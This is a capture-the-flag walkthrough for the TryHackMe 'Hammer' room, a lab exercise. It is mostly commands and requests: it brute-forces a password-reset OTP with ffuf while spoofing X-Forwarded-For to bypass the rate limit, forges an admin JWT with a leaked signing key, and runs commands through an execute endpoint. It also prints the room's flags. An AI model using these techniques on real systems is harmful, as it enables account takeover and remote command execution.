# Room: Hammer

## General Info
- **Room link:** [Hammer](https://tryhackme.com/room/hammer


## Description

With the Hammer in hand, can you bypass the authentication mechanisms and get RCE on the system?

## Provided Files / Links
- [x] Target Machine IP (10.10.249.72)

## Enumeration / Recon

- Port Enumeration:
` nmap -sV 10.10.249.72 -p- -T5`

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

- Directory Enumeration

I enumerate on the port 1337:

`gobuster dir -u http://10.10.249.72:1337 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt`

```
/javascript           (Status: 301) [Size: 324] [--> http://10.10.249.72:1337/javascript/]
/vendor               (Status: 301) [Size: 320] [--> http://10.10.249.72:1337/vendor/]
/phpmyadmin           (Status: 301) [Size: 324] [--> http://10.10.249.72:1337/phpmyadmin/]
/server-status        (Status: 403) [Size: 279]
```


`gobuster dir -u http://10.10.249.72:1337 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files.txt`

```
/index.php            (Status: 200) [Size: 1326]
/config.php           (Status: 200) [Size: 0]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/.htaccess            (Status: 403) [Size: 279]
/.                    (Status: 200) [Size: 1326]
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/dashboard.php        (Status: 302) [Size: 0] [--> logout.php]
/.htpasswd            (Status: 403) [Size: 279]
/.htm                 (Status: 403) [Size: 279]
/.htpasswds           (Status: 403) [Size: 279]
/reset_password.php   (Status: 200) [Size: 1664]
/.htgroup             (Status: 403) [Size: 279]
/wp-forum.phps        (Status: 403) [Size: 279]
/.htaccess.bak        (Status: 403) [Size: 279]
/.htuser              (Status: 403) [Size: 279]
/.htc                 (Status: 403) [Size: 279]
/.ht                  (Status: 403) [Size: 279]
```

When visiting the index.php page (login form), I noticed a commentaire in the html:
`<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->`.

I then used ffuf to enumerate the directories with the given pattern.

`ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://10.10.249.72:1337/hmr_FUZZ'`

```
css                     [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 19ms]
js                      [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 19ms]
logs                    [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 20ms]
images                  [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 4349ms]
```

None of the directories/files that were enumerated with gobuster gave relevant information.

I then had a look at the /hmr_js, /hmr_css, /hmr_images and /hmr_logs, and found these relevant logs in /hmr_logs:

```
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
[Mon Aug 19 12:04:56.654321 2024] [core:error] [pid 12349:tid 139999999999995] [client 192.168.1.22:38100] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
[Mon Aug 19 12:05:07.543210 2024] [authz_core:error] [pid 12350:tid 139999999999994] [client 192.168.1.25:46234] AH01627: client denied by server configuration: /home/hammerthm/test.php
[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
[Mon Aug 19 12:09:51.109876 2024] [core:error] [pid 12354:tid 139999999999990] [client 192.168.1.50:45998] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down
```

Notes:
-tester@hammer.thm seems to be a valid email
-hammerthm is a user in the target machine

With the newly found email tester@hammer.thm, I then tried to brute-force the OTP in the http://10.10.249.72:1337/reset_password.php page with Burp Suite but there was a rate limit in place.

Once the request for the OTP is made, there is a counter of 180s that will redirect you to /logout.php if you don't have the right OTP.

Since there is a rate limit on this endpoint, I will be be fuzzing the "X-Forwarded-For" header to get a rate limit bypass.

First, I create a txt file containing all the possible pin numers (between 0000 and 9999):

`seq -w 0000 9999 > pins.txt `

Then I use the following ffuf command to launch the attack (after grabbing the right PHPSESSID cookie):

```
ffuf -w pins.txt -u "http://hammer.thm:1337/reset_password.php" -X “POST” -d "recovery_code=FUZZ&s=60" -H "Cookie: PHPSESSID=CookieID" -H "X-Forwarded-For: FUZZ" -H “Content-Type: application/x-www-form-urlencoded" -fr "Invalid" -s
```

(I use the flag -fr "Invalid" to filter out the responses containing the word "Invalid").

I then get the right OTP password: 8541.

I change the password for the user tester@hammer.thm and I'm now able to log in. I find the first flag: **THM{AuthBypass3D}**.

### Logged in access

Once logged in, I have a look at the dashboard.php request in the network tab of the browser and find a JWT token:

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzQ3NTg4NDQyLCJleHAiOjE3NDc1OTIwNDIsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.Rg_nED2D4PW7maxBWCh7BrlDs7nVR6FKicY6BV6nsFk`

Using jwt.io, I find that this jwt token needs a 256 bit secret.

Using the "command" field in the web page, I type `ls` and find that there is a `188ade1.key` file available. I navigate to http://10.10.249.72:1337/188ade1.key to download the resource.

`cat 188ade1.key` => `56058354efb3daa97ebab00fabd7a7d7`

 I change the role of the user in the JWT token ("role": "admin" instead of "role": "user") and I use this key to validate the jwt signature.

 The new JWT token with the admin permission is the following:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzQ3NTg4NDQyLCJleHAiOjE3NDc1OTIwNDIsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.9uM0nkCPMrQA3sHY8Htrl5ALwn7RKYnyLmG45gjPEVM
```

The only thing left to do is now to make the POST request /execute_command.php with the JWT token with admin privileges.

I use Burp Suite with the following request:

```
POST /execute_command.php HTTP/1.1
Host: 10.10.249.72:1337
Content-Length: 39
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzQ3NTg4NDQyLCJleHAiOjE3NDc1OTIwNDIsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.9uM0nkCPMrQA3sHY8Htrl5ALwn7RKYnyLmG45gjPEVM
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: */*
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Origin: http://10.10.249.72:1337
Referer: http://10.10.249.72:1337/dashboard.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=1h2f4encdgd906cqvbjtq17ehp; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzQ3NTg4NDQyLCJleHAiOjE3NDc1OTIwNDIsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.md9lPE3rTrqVvsJmK1lB4ixAPCTmQyBuhP-Kd6LlAEI; persistentSession=no
Connection: keep-alive

{"command":"cat /home/ubuntu/flag.txt"}
```

And I get the flag **THM{RUNANYCOMMAND1337}** in the response:

```
{"output":"THM{RUNANYCOMMAND1337}\n"}
```
